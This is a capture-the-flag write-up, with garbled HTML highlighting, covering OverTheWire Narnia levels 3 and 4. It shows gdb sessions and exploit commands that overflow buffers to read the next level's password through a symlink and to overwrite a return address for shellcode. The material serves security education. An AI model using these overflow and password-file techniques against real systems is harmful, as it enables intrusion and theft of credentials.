<span class="n">The</span> <span class="n">text</span> <span class="n">starts</span> <span class="n">with</span><span class="o">:</span>
</pre></div>


<p>narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@melinda:/narnia$ cat narnia3.c</p>
<h1>include <stdio.h></h1>
<h1>include <sys/types.h></h1>
<h1>include <sys/stat.h></h1>
<h1>include <fcntl.h></h1>
<h1>include <unistd.h></h1>
<h1>include <stdlib.h></h1>
<h1>include <string.h></h1>
<p>int main(int argc, char **argv){</p>
<div class="highlight"><pre>    <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* open files */</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* copy from file1 to file2 */</span>
    <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>

    <span class="cm">/* close &#39;em */</span>
    <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>

    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</pre></div>


<p>}</p>
<div class="highlight"><pre><span class="n">This</span> <span class="n">program</span> <span class="n">receives</span> <span class="n">an</span> <span class="n">inputs</span> <span class="n">file</span> <span class="n">name</span><span class="p">,</span> <span class="n">and</span> <span class="n">copy</span> <span class="n">the</span> <span class="n">contend</span> <span class="n">of</span> <span class="n">the</span> <span class="n">first</span> <span class="k">for</span> <span class="n">the</span> <span class="n">a</span> <span class="n">second</span> <span class="n">file</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="p">.</span> <span class="n">If</span> <span class="n">we</span> <span class="n">notice</span> <span class="n">the</span> <span class="n">order</span> <span class="n">in</span> <span class="n">what</span> <span class="n">the</span> <span class="n">variables</span> <span class="n">were</span> <span class="n">declared</span><span class="o">:</span>
</pre></div>


<div class="highlight"><pre>    <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</pre></div>


<div class="highlight"><pre><span class="cp">#### Step 1: Understanding what is going on in the memroy</span>

<span class="n">Another</span> <span class="n">example</span> <span class="n">of</span> <span class="n">buffer</span> <span class="n">overflow</span><span class="p">,</span> <span class="n">where</span> <span class="n">we</span> <span class="n">want</span> <span class="n">to</span> <span class="n">overflow</span> <span class="n">ifile</span> <span class="n">to</span> <span class="n">have</span> <span class="n">the</span> <span class="n">variable</span> <span class="n">ofile</span> <span class="n">pointed</span> <span class="n">to</span> <span class="n">a</span> <span class="n">file</span> <span class="n">we</span> <span class="n">can</span> <span class="n">open</span><span class="p">,</span> <span class="k">while</span> <span class="n">opening</span> <span class="n">a</span> <span class="n">file</span> <span class="n">we</span> <span class="n">want</span> <span class="n">to</span> <span class="n">read</span><span class="p">.</span>
<span class="n">The</span> <span class="n">iflie</span> <span class="n">should</span> <span class="n">be</span> <span class="n">the</span> <span class="n">password</span> <span class="n">file</span> <span class="n">in</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia4</span><span class="p">.</span> <span class="n">However</span> <span class="k">if</span> <span class="n">we</span> <span class="n">create</span> <span class="n">a</span> <span class="n">link</span> <span class="n">from</span> <span class="n">this</span> <span class="n">object</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">use</span> <span class="n">the</span> <span class="n">name</span> <span class="n">we</span> <span class="n">want</span><span class="p">.</span>
</pre></div>


<p>narnia3@melinda:/narnia$ gdb ./narnia3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<a href="http://bugs.launchpad.net/gdb-linaro/">http://bugs.launchpad.net/gdb-linaro/</a>...
Reading symbols from /games/narnia/narnia3...(no debugging symbols found)...done.
(gdb) set args "<code>python -c 'print "a"*3'</code>"
(gdb) r
Starting program: /games/narnia/narnia3 "<code>python -c 'print "a"*3'</code>"
error opening aaa
[Inferior 1 (process 19399) exited with code 0377]
(gdb) set args "<code>python -c 'print "a"*32'</code>"
(gdb) r
Starting program: /games/narnia/narnia3 "<code>python -c 'print "a"*32'</code>"
error opening
[Inferior 1 (process 5437) exited with code 0377]
(gdb) set args "<code>python -c 'print "a"*31'</code>"
(gdb) r
Starting program: /games/narnia/narnia3 "<code>python -c 'print "a"*31'</code>"
error opening aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[Inferior 1 (process 12807) exited with code 0377]
(gdb) set args "<code>python -c 'print "a"*33'</code>"
(gdb) r
Starting program: /games/narnia/narnia3 "<code>python -c 'print "a"*33'</code>"
error opening a
[Inferior 1 (process 25990) exited with code 0377]</p>
<div class="highlight"><pre>
</pre></div>


<p>(gdb) set args "<code>python -c 'print "a"*150'</code>"
(gdb) r
Starting program: /games/narnia/narnia3 "<code>python -c 'print "a"*150'</code>"
error opening aaaaaaaaaaaaaaaaaaaa����aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[Inferior 1 (process 29690) exited with code 0377]</p>
<div class="highlight"><pre><span class="mi">20</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span> <span class="mi">94</span><span class="o">=</span> <span class="mi">114</span><span class="o">+</span> <span class="mi">4</span> <span class="o">=</span> <span class="mi">150</span><span class="o">-</span><span class="mi">32</span>


<span class="cp">#### Step 2: Setting Up the plan for the explit</span>

<span class="mf">1.</span> <span class="n">Go</span> <span class="n">inside</span> <span class="n">a</span> <span class="n">folder</span> <span class="n">we</span> <span class="n">can</span> <span class="n">write</span> <span class="p">(</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">yay</span><span class="o">/</span> <span class="n">here</span><span class="p">)</span>
<span class="mf">1.</span> <span class="n">We</span> <span class="n">need</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">file</span> <span class="n">that</span> <span class="n">we</span> <span class="n">can</span> <span class="n">read</span> <span class="p">(</span><span class="n">and</span> <span class="n">will</span> <span class="n">have</span> <span class="n">the</span> <span class="n">copy</span> <span class="n">of</span> <span class="n">our</span> <span class="n">password</span><span class="p">,</span> <span class="n">touch</span> <span class="n">out</span>
<span class="mf">2.</span> <span class="n">Lets</span> <span class="n">create</span> <span class="n">a</span> <span class="n">ln</span> <span class="k">for</span> <span class="n">the</span> <span class="n">infile</span> <span class="n">name</span> <span class="n">should</span> <span class="n">have</span> <span class="mi">32</span> <span class="n">spaces</span> <span class="o">+</span> <span class="n">the</span> <span class="n">name</span> <span class="k">for</span> <span class="n">a</span> <span class="n">ofile</span> <span class="n">we</span> <span class="n">can</span> <span class="n">open</span><span class="p">,</span> <span class="n">this</span> <span class="n">will</span> <span class="n">link</span> <span class="n">to</span> <span class="n">the</span> <span class="n">file</span> <span class="n">to</span> <span class="n">infile</span> <span class="n">The</span> <span class="n">obvious</span> <span class="n">choice</span> <span class="k">for</span> <span class="n">ifile</span> <span class="n">is</span> <span class="n">of</span> <span class="n">course</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia4</span>

 <span class="err">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;print &#39;A&#39;*32 + &#39;out&#39;&quot;</span><span class="p">)</span>

<span class="n">ln</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia4</span> <span class="err">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;print &#39;A&#39;*32 + &#39;out&#39;&quot;</span><span class="p">)</span>


<span class="cp">#### Step 3: Run!</span>

<span class="n">narnia3</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">yay</span><span class="err">$</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia3</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;print &#39;A&#39;*32 + &#39;out&#39;&quot;</span><span class="err">`</span><span class="n">copied</span> <span class="n">contents</span> <span class="n">of</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAout</span> <span class="n">to</span> <span class="n">a</span> <span class="n">safer</span> <span class="n">place</span><span class="p">...</span> <span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="n">narnia3</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">yay</span><span class="err">$</span> <span class="n">cat</span> <span class="n">out</span>


<span class="n">_______</span>

<span class="cp">## Level 4</span>


<span class="n">This</span> <span class="n">problem</span> <span class="n">starts</span> <span class="n">with</span><span class="o">:</span>
</pre></div>


<p>narnia4@melinda:/narnia$ ./narnia4
narnia4@melinda:/narnia$ cat narnia4.c</p>
<h1>include <string.h></h1>
<h1>include <stdlib.h></h1>
<h1>include <stdio.h></h1>
<h1>include <ctype.h></h1>
<p>extern char **environ;</p>
<p>int main(int argc,char **argv){
  int i;
  char buffer[256];</p>
<p>for(i = 0; environ[i] != NULL; i++)
    memset(environ[i], '\0', strlen(environ[i]));</p>
<p>if(argc&gt;1)
    strcpy(buffer,argv[1]);</p>
<p>return 0;
}</p>
<div class="highlight"><pre><span class="nx">So</span> <span class="nx">what</span> <span class="k">this</span> <span class="nx">program</span> <span class="nx">get</span> <span class="nx">some</span> <span class="kr">import</span> <span class="nx">arguments</span><span class="p">,</span> <span class="nx">create</span> <span class="nx">a</span> <span class="nx">buffer</span> <span class="nx">array</span><span class="p">,</span> <span class="nx">then</span> <span class="nx">it</span> <span class="nx">make</span> <span class="nx">all</span> <span class="nx">the</span> <span class="nx">enviroment</span> <span class="nx">variables</span> <span class="nx">equal</span> <span class="nx">zero</span> <span class="p">(</span><span class="nx">so</span> <span class="nx">we</span> <span class="nx">cant</span> <span class="nx">place</span> <span class="nx">shellchode</span> <span class="k">in</span> <span class="nx">an</span> <span class="nx">enviroment</span> <span class="nx">variables</span><span class="p">).</span> <span class="nx">then</span> <span class="nx">reads</span> <span class="nx">the</span> <span class="nx">arguments</span><span class="p">,</span> <span class="k">if</span> <span class="nx">there</span> <span class="nx">are</span> <span class="nx">some</span><span class="p">,</span> <span class="nx">it</span> <span class="nx">jusst</span> <span class="nx">copies</span> <span class="nx">the</span> <span class="nx">argument</span> <span class="nx">to</span> <span class="nx">buffer</span><span class="p">.</span> <span class="nx">How</span> <span class="k">do</span> <span class="nx">we</span> <span class="nx">exploit</span> <span class="k">this</span><span class="o">?</span> <span class="nx">Simple</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">overwrite</span> <span class="nx">our</span> <span class="k">return</span> <span class="nx">addres</span><span class="p">,</span> <span class="nx">just</span> <span class="nx">like</span> <span class="nx">we</span> <span class="nx">did</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">level</span> <span class="mi">2</span><span class="p">,</span><span class="nx">but</span> <span class="k">this</span> <span class="nx">time</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">not</span> <span class="nx">use</span> <span class="nx">the</span> <span class="nx">address</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">env</span> <span class="nx">variables</span><span class="p">.</span>

<span class="nx">Since</span> <span class="nx">our</span> <span class="nx">stack</span> <span class="nx">us</span> <span class="nx">executable</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">place</span> <span class="nx">the</span> <span class="nx">shellcode</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">stack</span> <span class="nx">and</span> <span class="nx">change</span> <span class="k">return</span> <span class="nx">address</span> <span class="nx">so</span> <span class="nx">it</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">executable</span>


<span class="nx">since</span> <span class="nx">we</span> <span class="nx">dont</span> <span class="nx">have</span> <span class="nx">ASLR</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">assume</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">stack</span> <span class="nx">will</span> <span class="nx">have</span> <span class="nx">the</span> <span class="nx">same</span> <span class="nx">space</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">every</span> <span class="nx">time</span>


<span class="nx">The</span>  <span class="nx">memset</span><span class="p">()</span>  <span class="kd">function</span> <span class="nx">fills</span> <span class="nx">the</span> <span class="nx">first</span> <span class="nx">n</span> <span class="nx">bytes</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">memory</span> <span class="nx">area</span> <span class="nx">pointed</span>
       <span class="nx">to</span> <span class="nx">by</span> <span class="nx">s</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">constant</span> <span class="kr">byte</span> <span class="nx">c</span><span class="p">.</span>


<span class="err">####</span> <span class="nx">Step</span> <span class="mi">1</span><span class="o">:</span> <span class="nx">Learning</span> <span class="nx">the</span> <span class="nx">relevant</span> <span class="nx">address</span> <span class="k">in</span> <span class="nx">mremory</span><span class="o">:</span>



<span class="nx">using</span> <span class="nx">gdb</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">extract</span> <span class="nx">the</span> <span class="nx">relevant</span> <span class="nx">memory</span> <span class="nx">locations</span><span class="o">:</span>
</pre></div>


<p>narnia4@melinda:/narnia$ gdb narnia4 <code>python -c "print 'A'*256"</code>
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<a href="http://bugs.launchpad.net/gdb-linaro/">http://bugs.launchpad.net/gdb-linaro/</a>...
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
/games/narnia/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: File name too long.
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
narnia4@melinda:/narnia$ gdb --args  narnia4 <code>python -c "print 'A'*256"</code>
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html</a>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<a href="http://bugs.launchpad.net/gdb-linaro/">http://bugs.launchpad.net/gdb-linaro/</a>...
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 &lt;+0&gt;: push   ebp
   0x08048445 &lt;+1&gt;: mov    ebp,esp
   0x08048447 &lt;+3&gt;: push   edi
   0x08048448 &lt;+4&gt;: and    esp,0xfffffff0
   0x0804844b &lt;+7&gt;: sub    esp,0x130
   0x08048451 &lt;+13&gt;:  mov    DWORD PTR [esp+0x12c],0x0
   0x0804845c &lt;+24&gt;:  jmp    0x80484c0 <main+124>
   0x0804845e &lt;+26&gt;:  mov    eax,ds:0x80497d0
   0x08048463 &lt;+31&gt;:  mov    edx,DWORD PTR [esp+0x12c]
   0x0804846a &lt;+38&gt;:  shl    edx,0x2
   0x0804846d &lt;+41&gt;:  add    eax,edx
   0x0804846f &lt;+43&gt;:  mov    eax,DWORD PTR [eax]
   0x08048471 &lt;+45&gt;:  mov    DWORD PTR [esp+0x1c],0xffffffff
   0x08048479 &lt;+53&gt;:  mov    edx,eax
   0x0804847b &lt;+55&gt;:  mov    eax,0x0
   0x08048480 &lt;+60&gt;:  mov    ecx,DWORD PTR [esp+0x1c]
   0x08048484 &lt;+64&gt;:  mov    edi,edx
   0x08048486 &lt;+66&gt;:  repnz scas al,BYTE PTR es:[edi]
   0x08048488 &lt;+68&gt;:  mov    eax,ecx
   0x0804848a &lt;+70&gt;:  not    eax
   0x0804848c &lt;+72&gt;:  lea    ecx,[eax-0x1]
   0x0804848f &lt;+75&gt;:  mov    eax,ds:0x80497d0
   0x08048494 &lt;+80&gt;:  mov    edx,DWORD PTR [esp+0x12c]
   0x0804849b &lt;+87&gt;:  shl    edx,0x2
   0x0804849e &lt;+90&gt;:  add    eax,edx
   0x080484a0 &lt;+92&gt;:  mov    eax,DWORD PTR [eax]
   0x080484a2 &lt;+94&gt;:  mov    edx,ecx
   0x080484a4 &lt;+96&gt;:  mov    DWORD PTR [esp+0x8],edx
   0x080484a8 &lt;+100&gt;: mov    DWORD PTR [esp+0x4],0x0
   0x080484b0 &lt;+108&gt;: mov    DWORD PTR [esp],eax
   0x080484b3 &lt;+111&gt;: call   0x8048380 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#109;&#101;&#109;&#115;&#101;&#116;&#64;&#112;&#108;&#116;">&#109;&#101;&#109;&#115;&#101;&#116;&#64;&#112;&#108;&#116;</a>
   0x080484b8 &lt;+116&gt;: add    DWORD PTR [esp+0x12c],0x1
   0x080484c0 &lt;+124&gt;: mov    eax,ds:0x80497d0
   0x080484c5 &lt;+129&gt;: mov    edx,DWORD PTR [esp+0x12c]
   0x080484cc &lt;+136&gt;: shl    edx,0x2
   0x080484cf &lt;+139&gt;: add    eax,edx
   0x080484d1 &lt;+141&gt;: mov    eax,DWORD PTR [eax]
   0x080484d3 &lt;+143&gt;: test   eax,eax
   0x080484d5 &lt;+145&gt;: jne    0x804845e <main+26>
   0x080484d7 &lt;+147&gt;: cmp    DWORD PTR [ebp+0x8],0x1
   0x080484db &lt;+151&gt;: jle    0x80484f5 <main+177>
   0x080484dd &lt;+153&gt;: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e0 &lt;+156&gt;: add    eax,0x4
   0x080484e3 &lt;+159&gt;: mov    eax,DWORD PTR [eax]
   0x080484e5 &lt;+161&gt;: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 &lt;+165&gt;: lea    eax,[esp+0x2c]
   0x080484ed &lt;+169&gt;: mov    DWORD PTR [esp],eax
   0x080484f0 &lt;+172&gt;: call   0x8048350 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#115;&#116;&#114;&#99;&#112;&#121;&#64;&#112;&#108;&#116;">&#115;&#116;&#114;&#99;&#112;&#121;&#64;&#112;&#108;&#116;</a>
   0x080484f5 &lt;+177&gt;: mov    eax,0x0
   0x080484fa &lt;+182&gt;: mov    edi,DWORD PTR [ebp-0x4]
   0x080484fd &lt;+185&gt;: leave
   0x080484fe &lt;+186&gt;: ret
End of assembler dump.
(gdb) b *main+182
Breakpoint 1 at 0x80484fa
(gdb) r
Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
<div class="highlight"><pre>
</pre></div>


<p>(gdb) x/90xw $esp
0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
0xffffd4c0: 0x00000000  0x00000000  0x00000001  0x41414141
0xffffd4d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd4f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd510: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd520: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd530: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd540: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd570: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd580: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd590: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd5c0: 0x41414141  0x41414141  0x41414141  0x00000000
0xffffd5d0: 0x08048500  0x00000000  0x00000000  0xf7e404b3
0xffffd5e0: 0x00000002  0xffffd674  0xffffd680  0xf7fcf000
0xffffd5f0: 0x00000000  0xffffd61c  0xffffd680  0x00000000
0xffffd600: 0x0804824c  0xf7fcaff4
(gdb) i f
Stack level 0, frame at 0xffffd5e0:
 eip = 0x80484fa in main; saved eip 0xf7e404b3
 Arglist at 0xffffd5d8, args:
 Locals at 0xffffd5d8, Previous frame's sp is 0xffffd5e0
 Saved registers:
  ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
(gdb) p 0xffffd5dc-0xffffd4cc
$1 = 272</p>
<div class="highlight"><pre>  <span class="nx">Now</span> <span class="nx">we</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">find</span> <span class="nx">where</span> <span class="nx">to</span> <span class="nx">voerwrite</span> <span class="nx">the</span> <span class="nx">stuk</span> <span class="kd">with</span> <span class="nx">th</span> <span class="nx">addres</span><span class="p">.</span> <span class="nx">Since</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">feel</span> <span class="nx">the</span> <span class="nx">stack</span> <span class="kd">with</span> <span class="nx">junk</span> <span class="nx">bytes</span> <span class="nx">anyway</span><span class="p">,</span> <span class="nx">together</span> <span class="kd">with</span> <span class="nx">the</span> <span class="k">return</span> <span class="nx">addres</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">can</span> <span class="nx">use</span> <span class="nx">NOPsled</span>


<span class="nx">narnia4</span><span class="err">@</span><span class="nx">melinda</span><span class="o">:</span><span class="err">/narnia$ gdb --args  narnia4 `python -c &quot;print &#39;A&#39;*272&quot;`</span>
<span class="nx">GNU</span> <span class="nx">gdb</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="o">/</span><span class="nx">Linaro</span> <span class="mf">7.4</span><span class="o">-</span><span class="mf">2012.04</span><span class="o">-</span><span class="mi">0</span><span class="nx">ubuntu2</span><span class="p">.</span><span class="mi">1</span><span class="p">)</span> <span class="mf">7.4</span><span class="o">-</span><span class="mf">2012.04</span>
<span class="nx">Copyright</span> <span class="p">(</span><span class="nx">C</span><span class="p">)</span> <span class="mi">2012</span> <span class="nx">Free</span> <span class="nx">Software</span> <span class="nx">Foundation</span><span class="p">,</span> <span class="nx">Inc</span><span class="p">.</span>
<span class="nx">License</span> <span class="nx">GPLv3</span><span class="o">+:</span> <span class="nx">GNU</span> <span class="nx">GPL</span> <span class="nx">version</span> <span class="mi">3</span> <span class="nx">or</span> <span class="nx">later</span> <span class="o">&lt;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;</span>
<span class="nx">This</span> <span class="nx">is</span> <span class="nx">free</span> <span class="nx">software</span><span class="o">:</span> <span class="nx">you</span> <span class="nx">are</span> <span class="nx">free</span> <span class="nx">to</span> <span class="nx">change</span> <span class="nx">and</span> <span class="nx">redistribute</span> <span class="nx">it</span><span class="p">.</span>
<span class="nx">There</span> <span class="nx">is</span> <span class="nx">NO</span> <span class="nx">WARRANTY</span><span class="p">,</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">extent</span> <span class="nx">permitted</span> <span class="nx">by</span> <span class="nx">law</span><span class="p">.</span>  <span class="nx">Type</span> <span class="s2">&quot;show copying&quot;</span>
<span class="nx">and</span> <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="nx">details</span><span class="p">.</span>
<span class="nx">This</span> <span class="nx">GDB</span> <span class="nx">was</span> <span class="nx">configured</span> <span class="nx">as</span> <span class="s2">&quot;x86_64-linux-gnu&quot;</span><span class="p">.</span>
<span class="nx">For</span> <span class="nx">bug</span> <span class="nx">reporting</span> <span class="nx">instructions</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">see</span><span class="o">:</span>
<span class="o">&lt;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//bugs.launchpad.net/gdb-linaro/&gt;...</span>
<span class="nx">Reading</span> <span class="nx">symbols</span> <span class="nx">from</span> <span class="o">/</span><span class="nx">games</span><span class="o">/</span><span class="nx">narnia</span><span class="o">/</span><span class="nx">narnia4</span><span class="p">...(</span><span class="nx">no</span> <span class="nx">debugging</span> <span class="nx">symbols</span> <span class="nx">found</span><span class="p">)...</span><span class="nx">done</span><span class="p">.</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">set</span> <span class="nx">disassembly</span><span class="o">-</span><span class="nx">flavor</span> <span class="nx">intel</span>
<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disas</span> <span class="nx">main</span>
<span class="nx">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nx">code</span> <span class="k">for</span> <span class="kd">function</span> <span class="nx">main</span><span class="o">:</span>
